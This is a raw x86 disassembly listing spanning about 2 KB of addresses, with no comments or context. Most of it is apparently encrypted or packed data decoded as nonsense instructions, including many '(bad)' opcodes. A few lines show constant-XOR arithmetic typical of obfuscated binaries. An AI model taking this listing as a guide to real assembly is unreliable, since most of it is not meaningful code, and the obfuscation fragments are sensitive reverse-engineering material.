  40d427:	mov    WORD PTR [esi],?
  40d429:	int3   
  40d42a:	push   0xb08744b2
  40d42f:	mov    al,ds:0x413d2991
  40d434:	or     al,0x60
  40d436:	sar    BYTE PTR [esi+0x2],cl
  40d439:	add    eax,0x29cdba7e
  40d43e:	retf   
  40d43f:	mov    dl,0xf4
  40d441:	stos   DWORD PTR es:[edi],eax
  40d442:	stc    
  40d443:	test   DWORD PTR [edi],0x42ab9cc4
  40d449:	mov    ebx,0x9d1300f3
  40d44e:	lods   eax,DWORD PTR ds:[esi]
  40d44f:	popf   
  40d450:	cdq    
  40d451:	scas   eax,DWORD PTR es:[edi]
  40d452:	mov    ebp,0xa2e21996
  40d457:	mov    ds,WORD PTR [eax*2+0x738ba1fe]
  40d45e:	inc    ebx
  40d45f:	test   eax,0xd2fd4a90
  40d464:	sbb    DWORD PTR [ebp-0x76974497],edi
  40d46a:	mov    ebx,0x5ab24247
  40d46f:	dec    edi
  40d470:	mov    ecx,0x16767e37
  40d475:	loopne 0x40d44f
  40d477:	jnp    0x40d499
  40d479:	imul   ebp,DWORD PTR [eax+eiz*2+0x34162d7],0x11fc1e53
  40d484:	stos   BYTE PTR es:[edi],al
  40d485:	aam    0xf2
  40d487:	pop    ss
  40d488:	sahf   
  40d489:	sub    BYTE PTR [ecx-0x60],0x51
  40d48d:	sbb    esi,edi
  40d48f:	xchg   BYTE PTR [ecx-0x3],dl
  40d492:	ins    DWORD PTR es:[edi],dx
  40d493:	fdiv   QWORD PTR [ebx-0x4812ed54]
  40d499:	push   0x75010cae
  40d49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49f:	stos   BYTE PTR es:[edi],al
  40d4a0:	jp     0x40d4e8
  40d4a2:	or     DWORD PTR [edi],edx
  40d4a4:	outs   dx,DWORD PTR ds:[esi]
  40d4a5:	jmp    0x6095d17b
  40d4aa:	push   esi
  40d4ab:	scas   al,BYTE PTR es:[edi]
  40d4ac:	rol    cl,1
  40d4ae:	pop    ecx
  40d4af:	popa   
  40d4b0:	out    0x25,eax
  40d4b2:	xchg   esp,eax
  40d4b3:	cmp    DWORD PTR [ebx],0xffffffca
  40d4b6:	dec    ecx
  40d4b7:	jp     0x40d4ab
  40d4b9:	pop    edi
  40d4ba:	pusha  
  40d4bb:	mov    bl,0xd6
  40d4bd:	mov    cl,0x5e
  40d4bf:	xchg   ecx,eax
  40d4c0:	mov    edx,0x214769cc
  40d4c5:	js     0x40d505
  40d4c7:	sub    ch,ah
  40d4c9:	fs mov dh,0x7e
  40d4cc:	mov    bh,0xab
  40d4ce:	adc    al,0xcb
  40d4d0:	sub    esp,DWORD PTR [ebp-0x5e41ff73]
  40d4d6:	inc    esi
  40d4d7:	jmp    0x40d4c2
  40d4d9:	mov    esp,0xe0d62877
  40d4de:	loopne 0x40d536
  40d4e0:	and    al,0xe4
  40d4e2:	or     dl,BYTE PTR [eax]
  40d4e4:	xchg   esi,eax
  40d4e5:	sub    edx,DWORD PTR [ebx]
  40d4e7:	or     DWORD PTR [ecx-0x55],0xffffff96
  40d4eb:	mov    edi,0xcf055261
  40d4f0:	rcl    edx,cl
  40d4f2:	jns    0x40d54a
  40d4f4:	pushf  
  40d4f5:	and    ebx,ebp
  40d4f7:	sbb    eax,0x4b09f2c
  40d4fc:	push   esi
  40d4fd:	dec    ebx
  40d4fe:	cmp    ecx,DWORD PTR [ebx-0x54]
  40d501:	rcl    DWORD PTR [ebx+0x43],cl
  40d504:	push   ecx
  40d505:	mov    gs,WORD PTR [ebp+0x3d]
  40d508:	jb     0x40d542
  40d50a:	stos   DWORD PTR es:[edi],eax
  40d50b:	mov    ds:0xe6d32d05,eax
  40d510:	pushf  
  40d511:	pop    ecx
  40d512:	loopne 0x40d54d
  40d514:	fcmovnb st,st(5)
  40d516:	loope  0x40d4f7
  40d518:	and    eax,0x42bb0df6
  40d51d:	jne    0x40d4c7
  40d51f:	and    al,BYTE PTR [ebx+0x2f99ce2a]
  40d525:	jne    0x40d56b
  40d527:	adc    esp,esi
  40d529:	outs   dx,BYTE PTR ds:[esi]
  40d52a:	or     ah,BYTE PTR [eax+0x43409063]
  40d530:	out    0x1d,eax
  40d532:	cli    
  40d533:	hlt    
  40d534:	sub    al,0x1e
  40d536:	call   0x92ac:0xcbf60ff1
  40d53d:	push   esp
  40d53e:	adc    bh,al
  40d540:	rol    DWORD PTR [ebp-0x30],0x52
  40d544:	dec    ecx
  40d546:	test   DWORD PTR [ecx],edx
  40d548:	(bad)  
  40d549:	in     al,dx
  40d54a:	mov    ecx,0x5a9acf5c
  40d54f:	xlat   BYTE PTR ds:[ebx]
  40d550:	push   esi
  40d551:	pop    edi
  40d552:	mov    al,0xde
  40d554:	fsubr  QWORD PTR [eax+0x746ba242]
  40d55a:	not    DWORD PTR [ebx-0x78]
  40d55d:	inc    ebx
  40d55e:	mov    al,BYTE PTR [edx+0x6380fd]
  40d564:	nop
  40d565:	pop    edx
  40d566:	pushf  
  40d567:	mov    es,ecx
  40d569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d56a:	mov    BYTE PTR [edi+edi*2],ch
  40d56d:	sub    DWORD PTR [edi-0x7b],esi
  40d570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d571:	sub    BYTE PTR [edx+0x2d],dl
  40d574:	push   ebx
  40d575:	jnp    0x40d58e
  40d577:	mov    eax,0x53e67d69
  40d57c:	pop    ebx
  40d57d:	sbb    DWORD PTR [ebx-0x2d07b7f7],edi
  40d583:	jp     0x40d5d6
  40d585:	(bad)
  40d589:	lea    ebx,[ebx+0xe6ef224]
  40d58f:	daa    
  40d590:	fwait
  40d591:	jge    0x40d521
  40d593:	adc    al,0xab
  40d595:	(bad)  
  40d596:	mov    DWORD PTR [eax+0x4159057c],edi
  40d59c:	push   0x5e
  40d59e:	ins    DWORD PTR es:[edi],dx
  40d59f:	mov    edi,0x1ba2fd23
  40d5a4:	push   eax
  40d5a5:	lock stc 
  40d5a7:	fbld   TBYTE PTR [eax-0x5]
  40d5aa:	(bad)  
  40d5ab:	inc    ebp
  40d5ac:	imul   esp,esi,0xfd5c0706
  40d5b2:	dec    ebp
  40d5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b4:	xchg   ecx,eax
  40d5b5:	icebp  
  40d5b6:	mov    ecx,DWORD PTR fs:[edx+0x332b5dd7]
  40d5bd:	cdq    
  40d5be:	jae    0x40d61f
  40d5c0:	mov    cl,0xdd
  40d5c2:	sbb    eax,0x91d481a8
  40d5c7:	(bad)  
  40d5c8:	in     eax,dx
  40d5c9:	ins    BYTE PTR es:[edi],dx
  40d5ca:	vdivps ymm6,ymm5,YMMWORD PTR [esi+0xf3db6cf]
  40d5d2:	add    eax,0x1372b9a9
  40d5d7:	adc    bl,BYTE PTR [eax+esi*4-0x431397c9]
  40d5de:	aas    
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5f2
  40d62d:	mov    eax,DWORD PTR fs:[ebp+0x7e7e902b]
  40d634:	jge    0x40d6b3
  40d636:	jle    0x40d6b6
  40d638:	stos   BYTE PTR es:[edi],al
  40d639:	out    0xb7,eax
  40d63b:	add    esi,DWORD PTR [ecx+edx*1+0x23736c52]
  40d642:	loope  0x40d64a
  40d644:	add    edi,ebx
  40d646:	push   edx
  40d647:	xchg   edi,eax
  40d648:	ins    BYTE PTR es:[edi],dx
  40d649:	dec    eax
  40d64a:	fidivr DWORD PTR [eax]
  40d64c:	(bad)  
  40d64d:	mov    ebx,0x4b307d1c
  40d652:	das    
  40d653:	aaa    
  40d654:	stos   DWORD PTR es:[edi],eax
  40d655:	(bad)  
  40d656:	push   edx
  40d657:	pop    ds
  40d658:	pop    ebx
  40d659:	cmp    DWORD PTR ds:0x9f384e28,eax
  40d65f:	ret    0xa47
  40d662:	xchg   ebp,eax
  40d663:	jmp    0x1c97a8e7
  40d668:	dec    esp
  40d669:	sbb    eax,eax
  40d66b:	xchg   DWORD PTR [ecx+0x6],eax
  40d66e:	loop   0x40d655
  40d670:	lahf   
  40d671:	add    BYTE PTR [ecx+0x28463056],bl
  40d677:	mov    cl,0x19
  40d679:	shl    BYTE PTR [edi],0xc9
  40d67c:	int3   
  40d67d:	arpl   WORD PTR [ebx+0x2],bp
  40d680:	cmp    BYTE PTR [eax+0x52],dh
  40d683:	cmp    ah,BYTE PTR [ebx-0x4d]
  40d686:	fistp  QWORD PTR [edi-0x2f763025]
  40d68c:	lods   al,BYTE PTR ds:[esi]
  40d68d:	xchg   ebp,eax
  40d68e:	shr    edi,1
  40d690:	inc    ecx
  40d691:	or     bh,BYTE PTR [edx+0x6f]
  40d694:	loopne 0x40d6b6
  40d696:	lock lods al,BYTE PTR ds:[esi]
  40d698:	inc    esi
  40d699:	pop    ss
  40d69a:	das    
  40d69b:	aam    0x27
  40d69d:	dec    ebx
  40d69e:	test   BYTE PTR [edi],ch
  40d6a0:	shl    ebp,1
  40d6a2:	mov    ds:0xe8637949,al
  40d6a7:	pushf  
  40d6a8:	adc    cl,ah
  40d6aa:	inc    ebx
  40d6ab:	fwait
  40d6ac:	xchg   DWORD PTR [ebp+0xdc4045e],edi
  40d6b2:	mov    esp,0xb4814450
  40d6b7:	mov    ds:0xf78a0add,al
  40d6bc:	xchg   ecx,eax
  40d6bd:	ins    BYTE PTR es:[edi],dx
  40d6be:	sbb    WORD PTR [ebx],cx
  40d6c1:	cld    
  40d6c2:	mov    eax,ds:0xcd5a0868
  40d6c7:	idiv   DWORD PTR ds:0xa0338197
  40d6cd:	push   ds
  40d6ce:	add    bl,0x42
  40d6d1:	dec    esp
  40d6d2:	push   edx
  40d6d3:	pop    eax
  40d6d4:	jmp    0xadda:0xcbadbddd
  40d6db:	in     al,dx
  40d6dc:	lods   eax,DWORD PTR ds:[esi]
  40d6dd:	repnz push DWORD PTR [edx+0x69]
  40d6e1:	jae    0x40d73f
  40d6e3:	jecxz  0x40d692
  40d6e5:	pushf  
  40d6e6:	pop    ebx
  40d6e7:	or     eax,0x918f8ff
  40d6ec:	jge    0x40d721
  40d6ee:	mov    eax,ds:0x42fda15a
  40d6f3:	frstor [esi+0x16a5ed60]
  40d6f9:	xor    bh,cl
  40d6fb:	mov    al,0x3d
  40d6fd:	add    al,BYTE PTR [esi]
  40d6ff:	fisttp DWORD PTR [ecx+ecx*8-0x4465430d]
  40d706:	outs   dx,DWORD PTR ds:[esi]
  40d707:	xchg   edx,eax
  40d708:	xor    BYTE PTR [edx],al
  40d70a:	(bad)  [edx]
  40d70c:	cli    
  40d70d:	mov    ah,0x44
  40d70f:	push   ds
  40d710:	push   ss
  40d711:	(bad)  
  40d713:	fcom   QWORD PTR [eax+0x43d339b2]
  40d719:	lods   eax,DWORD PTR ds:[esi]
  40d71a:	popf   
  40d71b:	rcr    DWORD PTR [eax-0x79],1
  40d71e:	inc    esp
  40d71f:	imul   edi,DWORD PTR [esi-0x27f63783],0xffffffcc
  40d726:	pop    ecx
  40d727:	push   edi
  40d728:	mov    ch,0xb6
  40d72a:	(bad)  
  40d72b:	cmp    al,0x10
  40d72d:	sbb    BYTE PTR [edi],0x73
  40d730:	in     al,dx
  40d731:	pop    ds
  40d732:	pop    esi
  40d733:	sahf   
  40d734:	mov    ebx,0xbea1c361
  40d739:	jge    0x40d71a
  40d73b:	ins    DWORD PTR es:[edi],dx
  40d73c:	mov    dl,0xc0
  40d73e:	fimul  WORD PTR [edx-0x1ab0aa3f]
  40d744:	or     BYTE PTR [ebx+0x5b],dh
  40d747:	aaa    
  40d748:	jp     0x40d70f
  40d74a:	or     eax,0x2755297b
  40d74f:	das    
  40d750:	shr    DWORD PTR [ebx-0x67],1
  40d753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d754:	pop    ds
  40d755:	inc    ecx
  40d756:	sub    al,0xcf
  40d758:	aam    0xe4
  40d75a:	cs push ecx
  40d75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d75d:	in     eax,0xd3
  40d75f:	pop    eax
  40d760:	inc    eax
  40d761:	shl    BYTE PTR ds:0x481ae5d5,cl
  40d767:	lahf   
  40d768:	outs   dx,DWORD PTR ds:[esi]
  40d769:	inc    eax
  40d76a:	jb     0x40d7dd
  40d76c:	das    
  40d76d:	inc    ecx
  40d76e:	mov    dh,0xf3
  40d770:	cmp    BYTE PTR [esi+0x52],0xea
  40d774:	ds adc edi,edi
  40d777:	lds    edx,FWORD PTR [ecx+0x28aa6028]
  40d77d:	imul   ebx,DWORD PTR [ecx-0x4],0x3ada0655
  40d784:	xor    al,0x4e
  40d786:	push   edx
  40d787:	(bad)  
  40d788:	mov    esi,0x73ba4160
  40d78d:	pusha  
  40d78e:	mov    esi,0xe8ff6577
  40d793:	test   cl,al
  40d795:	jae    0x40d78c
  40d797:	ret    0xd4a3
  40d79a:	lock sbb DWORD PTR [edi+0x32],ebx
  40d79e:	loopne 0x40d733
  40d7a0:	mov    eax,0x4ed6aa00
  40d7a5:	das    
  40d7a6:	pop    ds
  40d7a7:	push   ds
  40d7a8:	adc    BYTE PTR [ecx],0xd8
  40d7ab:	xor    al,0x84
  40d7ad:	mov    ds:0x255d2ce4,al
  40d7b2:	mov    al,0xd3
  40d7b4:	gs inc ebp
  40d7b6:	daa    
  40d7b7:	in     eax,0x3e
  40d7b9:	and    dh,BYTE PTR [edi+esi*1]
  40d7bc:	sub    ebp,DWORD PTR [ebx]
  40d7be:	jb     0x40d7e0
  40d7c0:	xchg   edx,eax
  40d7c1:	mov    ds:0xdab3157f,eax
  40d7c6:	mov    BYTE PTR [eax-0x32ec87a3],cl
  40d7cc:	pop    esi
  40d7cd:	inc    edi
  40d7ce:	pop    esp
  40d7cf:	jmp    0xeefc:0x8bc76cb5
  40d7d6:	cdq    
  40d7d7:	mov    dl,BYTE PTR [edi]
  40d7d9:	xor    al,0xac
  40d7db:	sub    eax,0xb2c922a6
  40d7e0:	inc    esi
  40d7e1:	lods   al,BYTE PTR ds:[esi]
  40d7e2:	loopne 0x40d7f0
  40d7e4:	test   eax,0x91457c3c
  40d7e9:	(bad)  
  40d7ea:	push   esp
  40d7eb:	ret    
  40d7ec:	mov    esi,0xd47b2a36
  40d7f1:	xchg   DWORD PTR [esi+edi*1+0xd6c294e],ebp
  40d7f8:	and    al,0x9
  40d7fa:	pop    edx
  40d7fb:	pop    ebx
  40d7fc:	push   0x36a2a9bf
  40d801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d802:	imul   ecx,DWORD PTR [edi+edx*1+0x3211d265],0xfec622ef
  40d80d:	or     BYTE PTR [eax+esi*2],ch
  40d810:	popf   
  40d811:	mov    BYTE PTR [ecx],dl
  40d813:	mov    ch,0xd9
  40d815:	(bad)
  40d819:	jp     0x40d865
  40d81b:	or     dl,ah
  40d81d:	jb     0x40d860
  40d81f:	xor    dl,BYTE PTR [ebx-0xe5520a]
  40d825:	inc    eax
  40d826:	idiv   BYTE PTR [esi+0x38]
  40d829:	pop    ds
  40d82a:	jb     0x40d885
  40d82c:	fimul  WORD PTR [ebx+0x73]
  40d82f:	out    dx,eax
  40d830:	cdq    
  40d831:	inc    ecx
  40d832:	mov    WORD PTR [edx-0x47],es
  40d835:	not    DWORD PTR [ebp-0x5116f198]
  40d83b:	mov    ebx,0xfc3dd942
  40d840:	fs scas eax,DWORD PTR es:[edi]
  40d842:	pop    ecx
  40d844:	mov    edi,0x702590b6
  40d849:	xor    edi,ecx
  40d84b:	inc    esi
  40d84c:	sub    al,0x9d
  40d84e:	pop    ds
  40d84f:	sub    al,0xbb
  40d851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d852:	out    dx,al
  40d853:	cli    
  40d854:	adc    al,0xd0
  40d856:	les    eax,FWORD PTR [eax+0x56621e6b]
  40d85c:	stc    
  40d85d:	sbb    ah,BYTE PTR [ebp+0x67]
  40d860:	push   eax
  40d861:	in     al,0x60
  40d863:	int3   
  40d864:	inc    esi
  40d865:	in     al,dx
  40d866:	xor    ah,dl
  40d868:	cs (bad) 
  40d86a:	cmp    al,0x36
  40d86c:	or     al,0x25
  40d86e:	ret    
  40d86f:	rcl    BYTE PTR [edi-0x6050b723],1
  40d875:	pop    edx
  40d876:	push   ecx
  40d877:	add    al,0x28
  40d879:	test   DWORD PTR [ebp-0x2c],ebp
  40d87c:	add    esi,DWORD PTR [esi+0x12e8c045]
  40d882:	enter  0x89ac,0x55
  40d886:	push   ebp
  40d887:	out    dx,eax
  40d888:	fidiv  WORD PTR [eax+0x2235653e]
  40d88e:	and    bh,cl
  40d890:	cdq    
  40d891:	sub    ah,BYTE PTR [ecx-0x16]
  40d894:	xor    eax,DWORD PTR [esi]
  40d896:	sbb    BYTE PTR [ebp+0x67],0x94
  40d89a:	(bad)  
  40d89b:	mov    ebx,0xfb4c1055
  40d8a0:	push   ds
  40d8a1:	sbb    BYTE PTR [eax+0x19],ch
  40d8a4:	push   ebx
  40d8a5:	xor    BYTE PTR ss:[eax],bl
  40d8a8:	sbb    eax,DWORD PTR [eax+ebp*4-0x4530a4cc]
  40d8af:	adc    eax,0x74dd9e96
  40d8b4:	inc    esi
  40d8b5:	pop    ebp
  40d8b7:	ror    BYTE PTR [ebp-0x7d336138],1
  40d8bd:	imul   edi
  40d8bf:	in     eax,dx
  40d8c0:	jbe    0x40d8b8
  40d8c2:	jp     0x40d8f3
  40d8c4:	aaa    
  40d8c5:	inc    ecx
  40d8c6:	xchg   ebx,eax
  40d8c7:	nop    DWORD PTR [esp+eax*1-0x10dff6d2]
  40d8cf:	outs   dx,BYTE PTR ds:[esi]
  40d8d0:	sub    al,0x4f
  40d8d2:	inc    ebp
  40d8d3:	sub    edx,DWORD PTR [ecx*4-0x7f9d9419]
  40d8da:	pcmpgtb mm5,QWORD PTR [ebp+0x7c]
  40d8de:	in     eax,0xd5
  40d8e0:	ret    
  40d8e1:	push   ss
  40d8e2:	mov    edx,0xa63427ba
  40d8e7:	fcmovnbe st,st(5)
  40d8e9:	inc    ebp
  40d8ea:	inc    edx
  40d8eb:	jp     0x40d96c
  40d8ed:	out    dx,al
  40d8ee:	and    al,0x55
  40d8f0:	in     eax,0xa3
  40d8f2:	jne    0x40d95f
  40d8f4:	ds mov dh,0x65
  40d8f7:	push   ds
  40d8f8:	call   0xd0ab:0x95e75875
  40d8ff:	jnp    0x40d8e2
  40d901:	mov    BYTE PTR [eax+ecx*4-0x50],dl
  40d905:	popf   
  40d906:	mov    eax,ds:0x5d6166a2
  40d90b:	cmp    edx,esp
  40d90d:	(bad)  
  40d90e:	pop    edx
  40d90f:	and    BYTE PTR [ebx-0x325e221c],0xc9
  40d916:	pop    es
  40d917:	dec    edx
  40d918:	and    BYTE PTR [ecx+0x27],bh
  40d91b:	aaa    
  40d91c:	jnp    0x40d977
  40d91e:	add    DWORD PTR [ebx],0xffffffed
  40d921:	cwde   
  40d922:	cmp    ebx,DWORD PTR [ebx+0x7780cc14]
  40d928:	and    eax,esp
  40d92a:	push   0x273d98f4
  40d92f:	leave  
  40d930:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40d932:	or     al,0x94
  40d934:	(bad)  
  40d935:	call   DWORD PTR [edx-0x3e07f2ff]
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	or     al,0x6b
  40d957:	push   ebp
  40d958:	inc    esp
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	xchg   ebp,eax
  40d962:	loope  0x40d91f
  40d964:	sbb    al,0xad
  40d966:	popa   
  40d967:	and    al,0x65
  40d969:	mov    DWORD PTR [esi+0x42],0x57552850
  40d970:	gs inc esi
  40d972:	mov    DWORD PTR [ebp-0x7c560a2],ecx
  40d978:	mov    bh,0xe3
  40d97a:	inc    ebp
  40d97b:	ja     0x40d9c6
  40d97d:	nop
  40d97e:	sbb    eax,0x70009718
  40d983:	fst    QWORD PTR [edx]
  40d985:	iret   
  40d986:	loopne 0x40d9e2
  40d988:	mov    dl,0x7f
  40d98a:	xchg   BYTE PTR ds:0xede72398,bl
  40d990:	mov    bl,0x5a
  40d992:	lods   al,BYTE PTR ds:[esi]
  40d993:	jle    0x40d92b
  40d995:	das    
  40d996:	mov    dl,0x43
  40d998:	pop    ecx
  40d999:	add    eax,0x87daa5f4
  40d99e:	mov    ebp,0x14959df0
  40d9a3:	test   eax,0x9fc5616c
  40d9a8:	push   0x3a
  40d9aa:	sub    DWORD PTR [ecx+0x41],eax
  40d9ad:	xor    al,0x6f
  40d9af:	mov    esi,0x327a32b7
  40d9b4:	push   es
  40d9b5:	(bad)  
  40d9b7:	into   
  40d9b8:	dec    DWORD PTR [eax+0x41]
  40d9bb:	fmul   QWORD PTR [edx]
  40d9bd:	inc    ecx
  40d9be:	pop    edi
  40d9bf:	sub    eax,0x559dfc3
  40d9c4:	mov    WORD PTR ds:0x76af61e7,?
  40d9ca:	call   0x3078:0x62f186fb
  40d9d1:	sub    BYTE PTR [edi+0x3d],ch
  40d9d4:	(bad)  fs:[eax+0x9]
  40d9d8:	or     bh,BYTE PTR [esi+0x77302c77]
  40d9de:	jmp    0x8656:0xe62fd588
  40d9e5:	mov    bh,0x74
  40d9e7:	mov    ebx,0xa428acec
  40d9ec:	scas   al,BYTE PTR es:[edi]
  40d9ed:	gs aaa 
  40d9ef:	or     dh,BYTE PTR [ecx+0x54]
  40d9f2:	mov    edi,0x14916daa
  40d9f7:	pushf  
  40d9f8:	and    bh,BYTE PTR [ebx+eax*8-0x74ec9106]
  40d9ff:	xchg   edi,eax
  40da00:	mov    esp,0xadd155d1
  40da05:	mov    edx,0xd5d0e54f
  40da0a:	(bad)  
  40da0b:	in     al,dx
  40da0c:	sub    DWORD PTR [ecx],edi
  40da0e:	xor    ebp,DWORD PTR [edi-0x5b]
  40da11:	mov    DWORD PTR [ebp+ebp*1+0x7a89f283],edi
  40da18:	scas   eax,DWORD PTR es:[edi]
  40da19:	fnstcw WORD PTR [edx]
  40da1b:	sub    al,BYTE PTR [edi-0x59c1bedb]
  40da21:	in     al,0x29
  40da23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da24:	cmp    eax,0xb9deae78
  40da29:	iret   
  40da2a:	sbb    al,0x46
  40da2c:	loopne 0x40da58
  40da2e:	push   ds
  40da2f:	arpl   WORD PTR ds:0x8fb78b2e,si
  40da35:	ins    BYTE PTR es:[edi],dx
  40da36:	not    DWORD PTR [ebx+0x3c]
  40da39:	stos   BYTE PTR es:[edi],al
  40da3a:	js     0x40da73
  40da3c:	cmp    DWORD PTR [ebp+0x1aa0bfa1],eax
  40da42:	shl    DWORD PTR [ebp+0x3116fd6a],0x7f
  40da49:	cmp    DWORD PTR [eax+0x35a2acc9],ecx
  40da4f:	iret   
  40da50:	or     ebx,DWORD PTR [edi]
  40da52:	aaa    
  40da53:	into   
  40da54:	fistp  QWORD PTR [edi]
  40da56:	mov    cl,0x60
  40da58:	in     al,0xb1
  40da5a:	hlt    
  40da5b:	and    cl,dh
  40da5d:	ja     0x40da85
  40da5f:	into   
  40da60:	das    
  40da61:	dec    edi
  40da62:	adc    eax,0xbc28d71e
  40da67:	ja     0x40da0d
  40da69:	push   edx
  40da6a:	push   0xdfa194d5
  40da6f:	jge    0x40dae7
  40da71:	inc    edi
  40da72:	xchg   ecx,eax
  40da73:	fsub   DWORD PTR [ecx+eiz*4]
  40da76:	jp     0x40da3d
  40da78:	out    dx,eax
  40da79:	and    DWORD PTR [ebp-0x4608b768],esp
  40da7f:	push   edx
  40da80:	jmp    0x35f79ebe
  40da85:	dec    BYTE PTR es:[edx+edx*2-0x5e]
  40da8a:	cdq    
  40da8b:	pop    ebx
  40da8c:	dec    ecx
  40da8d:	adc    edx,esi
  40da8f:	sub    eax,0x4825a687
  40da94:	mov    esp,DWORD PTR [edi]
  40da96:	ds gs add ecx,esi
  40da9a:	fnstsw WORD PTR [esi]
  40da9c:	repz pop edi
  40da9e:	imul   ebp,esi,0x37448747
  40daa4:	sub    al,BYTE PTR [ebp-0x3e991c1e]
  40daaa:	loop   0x40da7a
  40daac:	cmc    
  40daad:	jno    0x40da52
  40daaf:	add    eax,0x9c268aad
  40dab4:	retf   0x9e86
  40dab7:	xor    bl,BYTE PTR [ecx+edi*2]
  40daba:	call   0x72e37a72
  40dabf:	pop    ebp
  40dac0:	popf   
  40dac1:	aaa    
  40dac2:	call   0x8a1e:0xa708b7af
  40dac9:	inc    esp
  40daca:	sbb    ebp,DWORD PTR [ecx]
  40dacc:	cmp    DWORD PTR [ebx+0x7b5e725b],eax
  40dad2:	(bad)  
  40dad3:	loopne 0x40db17
  40dad5:	mov    bl,0x9
  40dad7:	rol    BYTE PTR [ebx-0x712bf802],0x64
  40dade:	inc    ecx
  40dadf:	jo     0x40da9d
  40dae1:	(bad)  
  40dae2:	call   FWORD PTR [ebp-0x4d]
  40dae5:	push   cs
  40dae6:	je     0x40db4b
  40dae8:	popa   
  40dae9:	call   0x26d3fd36
  40daee:	das    
  40daef:	scas   eax,DWORD PTR es:[edi]
  40daf0:	js     0x40db07
  40daf2:	add    eax,0x4bf78d41
  40daf7:	clc    
  40daf8:	inc    eax
  40daf9:	cdq    
  40dafa:	push   eax
  40dafb:	popa   
  40dafc:	daa    
  40dafd:	or     BYTE PTR ds:0xf5c2c837,bl
  40db03:	xchg   esi,eax
  40db04:	sub    eax,0x1c2735c6
  40db09:	sub    DWORD PTR [eax-0x45],esp
  40db0c:	pop    esi
  40db0d:	pop    ds
  40db0e:	sub    edx,edx
  40db10:	push   ebx
  40db11:	ror    edi,1
  40db13:	pusha  
  40db14:	loop   0x40dace
  40db16:	adc    DWORD PTR [edi],ebx
  40db18:	or     DWORD PTR [esp+edx*8-0x3],0xf87b518b
  40db20:	xchg   esp,eax
  40db21:	in     eax,0xa9
  40db23:	mov    BYTE PTR [ebx+0x60ea26e9],0x33
  40db2a:	xchg   edi,eax
  40db2b:	cmp    BYTE PTR [edi],bh
  40db2d:	sub    al,BYTE PTR [ebx]
  40db2f:	push   0xffffffdf
  40db31:	jbe    0x40db47
  40db33:	cmp    eax,0xb43689b0
  40db38:	into   
  40db39:	sub    DWORD PTR [eax-0x6a],esp
  40db3c:	and    BYTE PTR [ebx+0x6d],0xc2
  40db40:	mov    ecx,0x112e2443
  40db45:	retf   0x6d23
  40db48:	jnp    0x40db51
  40db4a:	mov    esi,0x6df191f7
  40db4f:	add    eax,0x68e3e72d
  40db54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db55:	icebp  
  40db56:	pop    edx
  40db57:	dec    esp
  40db58:	pop    ss
  40db59:	add    al,0x95
  40db5b:	fdivp  st(4),st
  40db5d:	push   cs
  40db5e:	push   ecx
  40db5f:	sbb    dh,BYTE PTR [ebp+0x1566b959]
  40db65:	inc    eax
  40db66:	sbb    DWORD PTR [ebx],0x800bd07
  40db6c:	(bad)  
  40db6d:	out    0x5f,eax
  40db6f:	call   0x1157:0x73254a92
  40db76:	scas   al,BYTE PTR es:[edi]
  40db77:	xlat   BYTE PTR ds:[ebx]
  40db78:	mov    edi,0xd926480e
  40db7d:	sub    BYTE PTR [ebp+edi*1+0x71179771],dh
  40db84:	call   0x147e:0x116b7ee1
  40db8b:	mov    cl,bh
  40db8d:	pop    es
  40db8e:	mov    eax,ds:0x4691250f
  40db93:	dec    ecx
  40db94:	mov    ch,0xc4
  40db96:	loopne 0x40dbd2
  40db98:	jbe    0x40dbff
  40db9a:	out    0xb,al
  40db9c:	mov    WORD PTR [ebx+0x39],gs
  40db9f:	pushf  
  40dba0:	mov    WORD PTR [ebx],es
  40dba2:	lds    eax,FWORD PTR [ecx+0xd03f5a1]
  40dba8:	pusha  
  40dba9:	pop    edx
  40dbaa:	xlat   BYTE PTR ds:[ebx]
  40dbab:	xor    eax,0x9e1eaef
  40dbb0:	dec    dh
  40dbb2:	adc    bl,BYTE PTR [ecx+0x67d2d915]
  40dbb8:	rcl    BYTE PTR [ecx],cl
  40dbba:	jle    0x40db94
  40dbbc:	push   ds
  40dbbd:	shl    BYTE PTR [eax-0x25],1
  40dbc0:	rol    cl,1
  40dbc2:	pop    esi
  40dbc3:	pop    esi
  40dbc4:	mov    ebp,0x3ef27c94
  40dbc9:	push   0xffffffc2
  40dbcb:	sub    bl,BYTE PTR [esi-0x3a6fd77c]
